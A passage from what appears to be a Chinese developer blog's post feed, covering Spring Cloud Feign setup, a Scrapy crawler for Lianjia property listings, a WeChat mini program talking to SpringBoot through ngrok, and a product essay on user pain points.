Routing–&gt;OpenFeign</p><p>2、在项目src–&gt;main–&gt;java–&gt;com.XXX.XXXXX–&gt;找到MyconsumerApplication(项目名字+Application)<br>在类方法上加@EnableEurekaClient,@EnableFeignClients这两个注解</p><p>3、找到项目中的application.properties，在其中加入以下语句：</p><pre><code>#设置端口号server.port=8082#给项目起名字spring.application.name=myconsumer#注册项目eureka.client.service-url.defaultZone=http://localhost:8080/eureka</code></pre><p>4、在消费者中建立一个文件夹(名字是Feign)在文件夹中建立类(名字为XXXFeign)，<br>在其中编写远程调用相关配置</p><pre><code>@FeignClient(&quot;myprovider&quot;)public interface TestFeign {    @RequestMapping(&quot;index&quot;)    public String a(@RequestParam(&quot;uname&quot;) String uname);}</code></pre><p>5、在Controllet中调用Feign</p><pre><code>@Controllerpublic class UserController {    @Autowired    Ufeign ufeign;    @RequestMapping(&quot;ajaxsel&quot;)    @ResponseBody    public List&lt;User&gt; l(){        List&lt;User&gt; list=ufeign.a();        return list;    }</code></pre><p>最后注意:<br>其中因为会遇到实体类的问题，所以需要创建公共实体类。<br>步骤为：<br>1、创建一个Maven项目，在Create from archetpe复选框前勾选上。</p><p>2、在下面的列表中找到org.apache.maven.archetypes:maven-archetype-quickstart,选中。然后点击next</p><p>3、接下来分别输入类型(groupId)，名字(artifactId),版本号根据自己的需求决定是否改变。点击下一步即可创建公共实体类</p><p>4、之后会让你确认信息，点击下一步即可创建公共实体类。</p><p>5、在pom.xml中只保留以下信息</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;bean&lt;/groupId&gt;  &lt;artifactId&gt;module&lt;/artifactId&gt;  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/project&gt;</code></pre><p>6、在src–&gt;main–&gt;java–&gt;bean创建公用的实体类。</p><p>7、删除其中的test文件夹</p><p>8、在右边找到Maven，点击展开后，找到项目名下面的Lifecycle展开后，<br>找到下面的install，双击。当出现以下内容时即创建成功。</p><pre><code>[INFO] BUILD SUCCESS[INFO] ------------------------------------------------------------------------[INFO] Total time:  1.369 s[INFO] Finished at: 2019-10-26T16:57:15+08:00[INFO] ------------------------------------------------------------------------Process finished with exit code 0</code></pre>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Python爬取链家所有房源和小区</title>
      <link href="2019/03/17/tong-guo-python-pa-qu-lian-jia-suo-you-fang-yuan-he-xiao-qu/"/>
      <url>2019/03/17/tong-guo-python-pa-qu-lian-jia-suo-you-fang-yuan-he-xiao-qu/</url>
      
        <content type="html"><![CDATA[<h1 id="通过Python爬取链家所有房源和小区信息"><a href="#通过Python爬取链家所有房源和小区信息" class="headerlink" title="通过Python爬取链家所有房源和小区信息"></a>通过Python爬取链家所有房源和小区信息</h1><p>链家房源爬虫，基于scrapy框架，数据存储在MongoDB</p><p>由于链家的限制房源列表最多显示1000页，3000条数据，所以这里通过小区信息爬取所有房源。</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy import Selectorimport jsonimport refrom house_spider.items import LianjiaVillageItem, LianjiaHouseItemclass LianjiaSpider(scrapy.Spider):    name = &#39;lianjia&#39;    allowed_domains = [&#39;cq.lianjia.com&#39;]    start_urls = [&#39;cq.lianjia.com&#39;]    def __init__(self, **kwargs):        super().__init__(**kwargs)        self.base_url = &#39;https://cq.lianjia.com&#39;    def start_requests(self):        request_url = &#39;https://cq.lianjia.com/xiaoqu/&#39;        yield scrapy.Request(url=request_url, callback=self.parse_district_links)    def parse_district_links(self, response):        &quot;&quot;&quot;提取地区链接&quot;&quot;&quot;        sel = Selector(response)        links = sel.css(&quot;div[data-role=&#39;ershoufang&#39;] div:first-child a::attr(href)&quot;).extract()        for link in links:            url = self.base_url + link            yield scrapy.Request(url=url, callback=self.parse_bizcircle_links)    def parse_bizcircle_links(self, response):        &quot;&quot;&quot;提取商圈链接&quot;&quot;&quot;        sel = Selector(response)        links = sel.css(&quot;div[data-role=&#39;ershoufang&#39;] div:nth-child(2) a::attr(href)&quot;).extract()        for link in links:            url = self.base_url + link            yield scrapy.Request(url=url, callback=self.parse_village_list, meta={&quot;ref&quot;: url})    def parse_village_list(self, response):        &quot;&quot;&quot;提取小区链接&quot;&quot;&quot;        sel = Selector(response)        links = sel.css(&quot;.listContent .xiaoquListItem .img::attr(href)&quot;).extract()        for link in links:            yield scrapy.Request(url=link, callback=self.parse_village_detail)        # page        page_data = sel.css(&quot;.house-lst-page-box::attr(page-data)&quot;).extract_first()        page_data = json.loads(page_data)        if page_data[&#39;curPage&#39;] &lt; page_data[&#39;totalPage&#39;]:            url = response.meta[&quot;ref&quot;] + &#39;pg&#39; + str(page_data[&#39;curPage&#39;] + 1)            yield scrapy.Request(url=url, callback=self.parse_village_list, meta=response.meta)    def parse_village_detail(self, response):        &quot;&quot;&quot;提取小区详情&quot;&quot;&quot;        village_url = response.url        sel = Selector(response)        zone = sel.css(&#39;.xiaoquDetailbreadCrumbs .l-txt a::text&#39;).extract()        latitude = 0        longitude = 0        try:            html = response.body.decode().replace(&#39;\r&#39;, &#39;&#39;)            local = html[html.find(&#39;resblockPosition:&#39;):html.find(&#39;resblockName&#39;) - 1]            m = re.search(&#39;(\d.*\d),(\d.*\d)&#39;, local)            longitude = m.group(1)            latitude = m.group(2)        except Exception:            pass        item = LianjiaVillageItem()        item[&#39;id&#39;] = village_url.replace(self.base_url + &#39;/xiaoqu/&#39;, &#39;&#39;).replace(&#39;/&#39;, &#39;&#39;)        item[&#39;name&#39;] = sel.css(&#39;.detailHeader .detailTitle::text&#39;).extract_first()        item[&#39;address&#39;] = sel.css(&#39;.detailHeader .detailDesc::text&#39;).extract_first()        item[&#39;latitude&#39;] = latitude        item[&#39;longitude&#39;] = longitude        item[&#39;zone&#39;] = &#39;,&#39;.join(zone)        item[&#39;year&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(1) .xiaoquInfoContent::text&#39;).extract_first()        item[&#39;build_type&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(2) .xiaoquInfoContent::text&#39;).extract_first()        item[&#39;property_costs&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(3) .xiaoquInfoContent::text&#39;).extract_first()        item[&#39;property_company&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(4) .xiaoquInfoContent::text&#39;).extract_first()        item[&#39;developers&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(5) .xiaoquInfoContent::text&#39;).extract_first()        item[&#39;buildings&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(6) .xiaoquInfoContent::text&#39;).extract_first()        item[&#39;total_house&#39;] = sel.css(&#39;.xiaoquInfo .xiaoquInfoItem:nth-child(7) .xiaoquInfoContent::text&#39;).extract_first()        print(item[&#39;name&#39;])        yield item        # 小区房源 https://cq.lianjia.com/ershoufang/c3620038190566370/        url = self.base_url + &quot;/ershoufang/c&quot; + item[&#39;id&#39;] + &quot;/&quot;        yield scrapy.Request(url=url, callback=self.parse_house_list, meta={&quot;ref&quot;: url})    def parse_house_list(self, response):        &quot;&quot;&quot;提取房源链接&quot;&quot;&quot;        sel = Selector(response)        # 链家有时小区查询不到数据        total = sel.css(&#39;.resultDes .total span::text&#39;).extract_first()        total = int(total)        if total &gt; 0:            # 提取房源链接            links = sel.css(&quot;.sellListContent li .info .title a::attr(href)&quot;).extract()            for link in links:                yield scrapy.Request(url=link, callback=self.parse_house_detail)            # 链接分页            page_data = sel.css(&quot;.house-lst-page-box::attr(page-data)&quot;).extract_first()            page_data = json.loads(page_data)            if page_data[&#39;curPage&#39;] == 1 and page_data[&#39;totalPage&#39;] &gt; 1:                price = response.url.replace(self.base_url + &#39;/ershoufang/&#39;, &#39;&#39;)                for x in range(2, page_data[&#39;totalPage&#39;] + 1, 1):                    url = self.base_url + &#39;/ershoufang/&#39; + &#39;pg&#39; + str(x) + price                    yield scrapy.Request(url=url, callback=self.parse_house_list)    def parse_house_detail(self, response):        &quot;&quot;&quot;提取房源信息&quot;&quot;&quot;        sel = Selector(response)        item = LianjiaHouseItem()        item[&#39;房屋Id&#39;] = response.url.replace(self.base_url + &#39;/ershoufang/&#39;, &#39;&#39;).replace(&#39;.html&#39;, &#39;&#39;)        item[&#39;标题&#39;] = sel.css(&#39;.title-wrapper .title .main::text&#39;).extract_first()        item[&#39;售价&#39;] = sel.css(&#39;.overview .content .price .total::text&#39;).extract_first()        item[&#39;小区&#39;] = sel.css(&#39;.overview .content .aroundInfo .communityName a.info::text&#39;).extract_first()        item[&#39;小区ID&#39;] = sel.css(&#39;.overview .content .aroundInfo .communityName a.info::attr(href)&#39;).extract_first().replace(&#39;/xiaoqu/&#39;, &#39;&#39;).replace(&#39;/&#39;, &#39;&#39;)        item[&#39;房屋户型&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(1)::text&#39;).extract_first()        item[&#39;所在楼层&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(2)::text&#39;).extract_first()        item[&#39;建筑面积&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(3)::text&#39;).extract_first()        item[&#39;户型结构&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(4)::text&#39;).extract_first()        item[&#39;套内面积&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(5)::text&#39;).extract_first()        item[&#39;建筑类型&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(6)::text&#39;).extract_first()        item[&#39;房屋朝向&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(7)::text&#39;).extract_first()        item[&#39;建筑结构&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(8)::text&#39;).extract_first()        item[&#39;装修情况&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(9)::text&#39;).extract_first()        item[&#39;梯户比例&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(10)::text&#39;).extract_first()        item[&#39;配备电梯&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(11)::text&#39;).extract_first()        item[&#39;产权年限&#39;] = sel.css(&#39;#introduction .base .content ul li:nth-child(12)::text&#39;).extract_first()        item[&#39;挂牌时间&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(1) span:nth-child(2)::text&#39;).extract_first()        item[&#39;交易权属&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(2) span:nth-child(2)::text&#39;).extract_first()        item[&#39;上次交易&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(3) span:nth-child(2)::text&#39;).extract_first()        item[&#39;房屋用途&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(4) span:nth-child(2)::text&#39;).extract_first()        item[&#39;房屋年限&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(5) span:nth-child(2)::text&#39;).extract_first()        item[&#39;产权所属&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(6) span:nth-child(2)::text&#39;).extract_first()        item[&#39;抵押信息&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(7) span:nth-child(2)::attr(title)&#39;).extract_first()        item[&#39;房本备件&#39;] = sel.css(&#39;#introduction .transaction .content ul li:nth-child(8) span:nth-child(2)::text&#39;).extract_first()        yield item</code></pre><p><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/B0C655564F174592844C2DFE897C7265/3118" alt><br><img src="https://note.youdao.com/yws/public/resource/b668ad7e2986aeae14431f59531ace89/xmlnote/7E5B19AFBC1A4B658B00A1873BEEBD0A/3120" alt></p>]]></content>
      
      
      <categories>
          
          <category> Python爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序与后端SpringBoot通信</title>
      <link href="2019/02/03/wei-xin-xiao-cheng-xu-yu-hou-duan-springboot-tong-xin/"/>
      <url>2019/02/03/wei-xin-xiao-cheng-xu-yu-hou-duan-springboot-tong-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序与后端SpringBoot通信"><a href="#微信小程序与后端SpringBoot通信" class="headerlink" title="微信小程序与后端SpringBoot通信"></a>微信小程序与后端SpringBoot通信</h1><h3 id="案例概述"><a href="#案例概述" class="headerlink" title="案例概述"></a>案例概述</h3><p>微信小程序请求后端SpirngBoot,中间使用Ngrok做内网穿透.<br><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/CE885778600E42938491F27E91BC8E79/2661" alt></p><h3 id="内网穿透Ngrok配置"><a href="#内网穿透Ngrok配置" class="headerlink" title="内网穿透Ngrok配置"></a>内网穿透Ngrok配置</h3><h3 id="下载Ngrok"><a href="#下载Ngrok" class="headerlink" title="下载Ngrok"></a>下载Ngrok</h3><blockquote><p><a href="https://ngrok.com/download" target="_blank" rel="noopener">https://ngrok.com/download</a></p></blockquote><h3 id="注册并配置Ngrok认证"><a href="#注册并配置Ngrok认证" class="headerlink" title="注册并配置Ngrok认证"></a>注册并配置Ngrok认证</h3><p>注册完Ngrok之后进入个人主页在Auth页面找到自己的验证码,然后打开Ngrok认证即可</p><p><img src="https://s2.ax1x.com/2019/07/03/ZtnNxe.png" alt></p><h3 id="配置端口和协议"><a href="#配置端口和协议" class="headerlink" title="配置端口和协议"></a>配置端口和协议</h3><p>我这里的端口是8181,因为我Tomcat的端口是8181\</p><blockquote><p>ngrok http 8181</p></blockquote><h3 id="Ngrok配置完成"><a href="#Ngrok配置完成" class="headerlink" title="Ngrok配置完成"></a>Ngrok配置完成</h3><p>配置完成之后Ngrok会为我们提供两个链接,一个是http协议的一个市https协议的.</p><p>Ngrok的作用说白了就是将你本地某个端口上运行的服务暴露在了公网上.</p><p>这里的穿透指的就是将内网中的服务穿过防火墙.<br><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/ED9712F8F49443C1B0A9D65EAA8B6E8A/2665" alt></p><h3 id="后端SpringBoot"><a href="#后端SpringBoot" class="headerlink" title="后端SpringBoot"></a>后端SpringBoot</h3><h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><p>接收微信小程序发来的请求,并根据请求做出响应</p><pre><code>package le.controll;import le.domain.Info;import le.utils.JSONResult;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;/*** @program: SpringBootIntrodoction* @description:* @author: Mr.Han* @create: 2019-01-26 22:16**/@Controllerpublic class QuickController2 {    @RequestMapping(&quot;/info&quot;)    @ResponseBody    public JSONResult quick(Info info) {        System.out.println(info.toString());        return JSONResult.ok(info);    }}</code></pre><h3 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h3><pre><code>package le.domain;import java.io.Serializable;/*** @program: SpringBootIntrodoction* @description: 测试实体类* @author: Mr.Han* @create: 2019-02-01 14:13**/public class Info implements Serializable {    private String name;    private String personName;    private Integer age;    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public String getPersonName() {        return personName;    }    public void setPersonName(String personName) {        this.personName = personName;    }    public Integer getAge() {        return age;    }    public void setAge(Integer age) {        this.age = age;    }    @Override    public String toString() {        return &quot;Info{&quot; +                &quot;name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, personName=&#39;&quot; + personName + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;}&#39;;    }}</code></pre><h3 id="JSON工具类"><a href="#JSON工具类" class="headerlink" title="JSON工具类"></a>JSON工具类</h3><pre><code>package chen.utils;import chen.domain.Info;import com.fasterxml.jackson.databind.util.JSONPObject;import org.springframework.boot.configurationprocessor.json.JSONObject;/*** @program: SpringBootIntrodoction* @description: 实体类转换成JSON* @author: Mr.Han* @create: 2019-02-01 14:17**/public class JSONResult {    // 响应业务状态    private Integer status;    // 响应消息    private String msg;    // 响应中的数据    private Object data;    private String ok;    // 不使用    public static JSONResult build(Integer status, String msg, Object data) {        return new JSONResult(status, msg, data);    }    public static JSONResult ok(Object data) {        return new JSONResult(data);    }    public static JSONResult ok() {        return new JSONResult(null);    }    public static JSONResult errorMsg(String msg) {        return new JSONResult(500, msg, null);    }    public static JSONResult errorMap(Object data) {        return new JSONResult(501, &quot;error&quot;, data);    }    public static JSONResult errorTokenMsg(String msg) {        return new JSONResult(502, msg, null);    }    public static JSONResult errorException(String msg) {        return new JSONResult(555, msg, null);    }    public JSONResult() {    }    public JSONResult(Integer status, String msg, Object data) {        this.status = status;        this.msg = msg;        this.data = data;    }    public JSONResult(Object data) {        this.status = 200;        this.msg = &quot;OK&quot;;        this.data = data;    }    public Boolean isOK() {        return this.status == 200;    }    public Integer getStatus() {        return status;    }    public void setStatus(Integer status) {        this.status = status;    }    public String getMsg() {        return msg;    }    public void setMsg(String msg) {        this.msg = msg;    }    public Object getData() {        return data;    }    public void setData(Object data) {        this.data = data;    }    public String getOk() {        return ok;    }    public void setOk(String ok) {        this.ok = ok;    }}</code></pre><h3 id="微信小程序端"><a href="#微信小程序端" class="headerlink" title="微信小程序端"></a>微信小程序端</h3><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><pre><code>&lt;view bindtap=&quot;clickMe&quot;&gt;点击发送请求&lt;/view&gt;</code></pre><p>绑定了一个bindtap事件,点击的时候发送请求</p><h3 id="JS代码"><a href="#JS代码" class="headerlink" title="JS代码"></a>JS代码</h3><pre><code>// pages/requestinterface/requestinterface.jsPage({  /**  * 页面的初始数据  */  data: {  },  clickMe: function() {    wx.request({      url: &#39;ngrok公网接口&#39;,      data: {        personName: &quot;张三的父亲&quot;,        name: &quot;张三&quot;,        age: 18      },      header: {        &#39;content-type&#39;: &#39;application/json&#39;       },      success(res) {        console.log(res.data)      }    })  }})</code></pre><h3 id="完整的流程"><a href="#完整的流程" class="headerlink" title="完整的流程"></a>完整的流程</h3><p><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/7DA9DB9E98644776B0AD870AAAC8523C/2667" alt></p><h3 id="特别提醒"><a href="#特别提醒" class="headerlink" title="特别提醒"></a>特别提醒</h3><p>因为我们使用的是Ngrok做的内网穿透,微信小程序默认识别出Ngrok的接口时非法的.<br><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/1A5B10B7B372467BA836F71645423091/2669" alt></p><p>这时候我们就必须要<strong>设置不校验合法域名</strong></p><p><img src="https://note.youdao.com/yws/public/resource/a7b28e89afc8e429d20c7293f6faa483/xmlnote/5C3B2976BF574C7780F48218C16B37B3/2671" alt></p>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你如何理解用户痛点</title>
      <link href="2018/12/28/ni-ru-he-li-jie-yong-hu-tong-dian/"/>
      <url>2018/12/28/ni-ru-he-li-jie-yong-hu-tong-dian/</url>
      
        <content type="html"><![CDATA[<h1 id="你如何理解用户痛点"><a href="#你如何理解用户痛点" class="headerlink" title="你如何理解用户痛点"></a>你如何理解用户痛点</h1><h3 id="什么是用户“痛点”"><a href="#什么是用户“痛点”" class="headerlink" title="什么是用户“痛点”"></a>什么是用户“痛点”</h3><p><img src="https://www.funtl.com/assets/QQ20150819154634.jpg" alt></p><p><strong>写在前面：</strong><br>本文讲的“痛点”，就是指让目标用户付出某种行动的最大阻碍。</p><p>比如在美图秀秀之前，大部分图像处理软件（比如 PS）都专注于提高处理图像的性能，这个时候，让用户使用图像处理软件的最大阻碍是什么呢？</p><p>我想可能并不是图像处理的性能——对大多数人来说，PS 的性能已经足够好</p><p><strong>这时，让用户使用图像处理软件最大的阻碍可能是易用性，因此“易用性”可能就是痛点，而抓住这一痛点，专注于提高易用性的美图秀秀就取得了初期成功。</strong></p><p>好了，那么如何像当初的美图秀秀一样发现用户的痛点呢？</p><p><strong>其实，只要你具备了基础信息，画一张图就够了。</strong></p><p><strong>首先，画一个横向的箭头，把用户使用图像处理软件的全过程：</strong><br><img src="https://www.funtl.com/assets/QQ20150819154645.jpg" alt></p><p>上面应该是一个正常用户使用图像处理软件的全部过程：先下载，然后学会怎么用，然后使用它做图片。</p><p><strong>然后，你需要找出在每个阶段，影响用户行为的关键因素有哪些？</strong></p><p><img src="https://www.funtl.com/assets/QQ20150819154656.jpg" alt></p><p>一般来说，可能影响用户行为的因素有：</p><ul><li><strong>性能/效用</strong>： 这东西能不能达到我想要的效果？</li><li><strong>形象</strong>： 是不是符合我个人形象的？</li><li><strong>可靠</strong>： 是 否存在风险？是否用起来不稳定？</li><li><strong>容易</strong>： 做出该行为是否很容易、不需要思考？</li><li><strong>价格</strong>： 做出该行为花钱多不多？</li></ul><p><strong>接着，你先把过去市场上产品聚焦点描成“橙色”：</strong><br><img src="https://www.funtl.com/assets/QQ20150819154835.jpg" alt></p><p>如果具备行业的了解，你就会发现：过去，以 PS 为主的图像处理软件专注于提高性能和可靠性，同时能够帮助它的使用者塑造“专家”的积极形象。</p><p>这个时候，你就需要问自己这样一个问题：</p><blockquote><p>在图中的15块方格内，阻碍用户的最大因素是什么？（也就是痛点）</p></blockquote><p>你就会发现：下载、学习和使用 3 个过程都不够容易，而且在下载过程，往往需要付出价格。</p><p><strong>然后，你就可以定位用户痛点了：</strong><br><img src="https://www.funtl.com/assets/QQ20150819154845.jpg" alt></p><p><strong>为什么我们需要不停地寻找痛点？</strong></p><p><strong>因为用户需求和行业都在不断变化，过去被所有人“想当然”认为是痛点的属性，很快可能就不再是痛点，而这时在大多数厂商一窝蜂聚焦于“曾经的痛点”时，你挖掘了新痛点，就可能逆流而上。</strong></p><p>大多数人的思维是“基于原有的问题，我的解决方案是对的吗？”——“如何比别人更好地提高性能？”</p><p>而“寻找痛点”则是考虑“我是否提出了正确的问题？”——“提高性能是不是一个好问题？如果不是，应该问什么新问题？”</p><p><strong>所以，寻找用户痛点的过程，往往意味着“提出新的问题”，而不是“原有问题提出正确的解决方案。”</strong></p><p>如何寻找？你可以用上面讲过的方法，画出用户的整张“痛点定位图”，寻找对用户的最大障碍来源。</p><h1 id="纵向寻找"><a href="#纵向寻找" class="headerlink" title="纵向寻找"></a>纵向寻找</h1><p><strong>在同一个过程中，纵向寻找阻碍用户的最大因素。</strong></p><p>比如过去的胰岛素（病人买回家自己注射，用来治疗糖尿病）市场，大部分公司的聚焦点在于使用过程中的“性能”和“风险”，致力于研发更高纯度、更高稳定性的胰岛素产品。</p><p>这在过去是合理的，因为比起纯度 10% 的胰岛素，纯度 50% 的胰岛素显然更能解决病人问题。</p><p>但是随着大部分知名品牌胰岛素纯度都提高到 99% 以上，继续提高 0.1 个百分点的纯度虽然耗费巨额资金，但是对消费者的使用却影响甚微。</p><p>这个时候，同类品牌都加入了胰岛素纯度的竞争（类似现在手机轻薄、屏幕等竞争），而 Novo Nordisk 却重新问自己这个问题：</p><p>然后它发现其实并不是“性能”和“风险”，而是“形象”和“容易程度”。</p><ul><li><strong>形象</strong>： 胰岛素消费者其实都不想让别人知道他们是糖尿病。</li><li><strong>容易</strong>： 过去的注射器非常麻烦，需要提前消毒并且注射。</li></ul><p><strong>所以他们转变了战略的聚焦点，不再花费大量精力提高纯度和稳定性，而是帮助消费者提升形象和容易程度。</strong><br><img src="https://www.funtl.com/assets/QQ20150819154856.jpg" alt></p><p>最终，他们研发出了这种“笔形”的胰岛素，不容易被识别，帮患者遮盖了“糖尿病人”的形象，同时不需要用针注射，提高了使用的容易程度。</p><p>所以，纵向寻找痛点，你需要先找出影响某个环节的全部因素，然后看哪个因素是消费者现在的最大阻碍。</p><h1 id="横向寻找"><a href="#横向寻找" class="headerlink" title="横向寻找"></a>横向寻找</h1><p><strong>你还可以横向寻找：如果所有的竞争者都在关注用户的“使用”阶段，那么我可能应该看看其他阶段有没有痛点机会。</strong></p><p>比如汽车行业，用户前后经过了购买、使用、修理、抛弃（转售）这几个环节。</p><p>而在大众甲壳虫之前，欧洲所有的汽车公司几乎都聚焦于用户的“使用环节”。为用户造出性能越来越好、也越来越让人有面子的汽车。</p><p>而甲壳虫却发现：这并不是当时对用户的最大障碍。因此适当降低了在使用阶段“效用”和“形象”上的投入，转而优化所有阶段的容易程度，同时提高使用阶段的适用性（适应更多的路面情况）。</p><p>因此大众造出的甲壳虫外观常年不变，也不能让开车的人更有面子，但是容易买到（销售渠道）、容易驾驶、维修方便（因为使用了标准化配件）同时容易转售（因为样子常年不变）。</p><p>再比如，70 年代在美国主打性价比的汽车品牌，在痛点定位图上是这样的：</p><p>这个时候如果问：<strong>价格敏感用户的最大阻碍是什么？</strong></p><p>就会发现这个关键阻碍并不发生在“购买阶段”，而是发生在“使用阶段”——因为石油危机，不论买的车多便宜，高昂的油价让人“买得起开不起”。</p><p>所以，主打省油的日系车大举进入美国市场，大获成功。</p><p>所以，寻找痛点时，可以问自己：<strong>消费者用我的产品分为哪几个阶段？现在哪个阶段是他们的关键障碍？</strong></p><p>比如过去中国的手机市场是渠道为王，手机厂商几乎一半的利润分给了渠道商。通过大量的渠道，手机厂商提供了购买的便利性：</p><blockquote><p>“消费者随时随地都能买到手机，可以拿在手上一一比较，而且可以当场买走，不用等待。”</p></blockquote><p>那么同样是1000-2000价位的手机，消费者的主要障碍发生在什么阶段呢？</p><p>其实很容易发现，<strong>主要障碍发生在使用阶段（2000的手机性能太差），而不是购买阶段（想要很便利地买到）。</strong></p><p>所以这就是最初的小米手机，大部分厂商努力的重点在渠道（“购买阶段”），小米的努力重点在产品性能（“使用阶段”）。</p><p><strong>不光可以用于寻找产品痛点，还可以用于文案痛点</strong></p><p>比如肯德基搞过一个在线优惠活动，文案如下：</p><p>如何分析这个广告呢？</p><p><strong>首先我们先列出消费的行动过程：先看到文案，然后参加活动。</strong></p><p><strong>然后找出每个阶段的主要驱动因素，比如：有兴趣、很容易做到等。</strong></p><p>就会发现这个文案的聚焦点在于：提高活动的吸引力，让人产生兴趣（比如足够的优惠）。</p><p><strong>但是如果问：现在限制消费者参加活动的关键因素是什么？</strong></p><p>答案应该是：整个过程太复杂，不够容易。</p><p><strong>这就意味着：刺激人参加活动，痛点应该是“降低复杂性”，如果不降低复杂性，一味提高奖励可能也没有作用。</strong></p><p>灵活运用方法，还可以换一种方式，分析文案的有效性。</p><p><strong>比如这个公益广告文案“真正的男人，不需要海豹鞭”。</strong></p><p>首先，我们先看人认知这一广告信息的过程：</p><ul><li><strong>注意：</strong> 注意到这个信息，激发了头脑的相关联想。比如看到“壮阳”联想到“性”等印象。</li><li><strong>理解：</strong> 理解这个信息的意思。</li><li><strong>信服：</strong> 信服刚刚所理解的信息。</li><li><strong>刺激行动：</strong> 因为信任这个信息而改变了行动。</li></ul><p>然后我们在纵向写上广告想要让人接受的信息。</p><p>比如“真正的男人不需要海豹鞭”实际上包含 2 层信息：</p><ul><li>海豹鞭被认为可以壮阳</li><li>吃海豹鞭的不是真男人</li></ul><p>然后把这个广告产生的所有影响涂成橙色，就会发现是这样的：</p><p>用海豹鞭不是真男人”这个信息缺乏说服力，基本上只是引起了注意并且让人理解。</p><p><strong>然而，通过隐含“海豹鞭被认为可以壮阳”这个信息，让很多本来没听说过海豹鞭的人，第一次知道了海豹鞭可以壮阳，并且更加信服</strong>（否则怎么会打广告说不要吃呢）。</p><p>所以，这个文案很可能会起到反面效果——为海豹鞭打了广告。</p><p>毕竟，如果是海豹鞭销售公司的广告文案，估计也可以这么写：</p><p>》真正的男人不需要海豹鞭 但，如果你没有他们那么强 请联系我们购买：XXXX.com</p><p>这也是为什么自杀相关的新闻曝光后，自杀的人会变多。</p><p>总之，既然文案是为了改变用户的行为，那么设计文案的时候也要分析：</p><p><strong>限制用户改变行为的关键障碍是什么？</strong></p><h1 id="改变用户的某个习惯"><a href="#改变用户的某个习惯" class="headerlink" title="改变用户的某个习惯"></a>改变用户的某个习惯</h1><p>除了产品设计、文案设计，其实几乎任何一种涉及改变的活动，都需要分析痛点，找到影响对方的关键障碍。</p><p>比如假设你想帮助人戒烟，那么首先列出吸烟的全部过程：</p><p>然后列出每个过程对应的影响因素，比如：</p><ul><li><strong>效用：</strong> 给人带来正面体验</li><li><strong>形象：</strong> 提升形象</li><li><strong>风险：</strong> 是否有风险</li><li><strong>容易：</strong> 过程是否容易做</li><li><strong>价格：</strong> 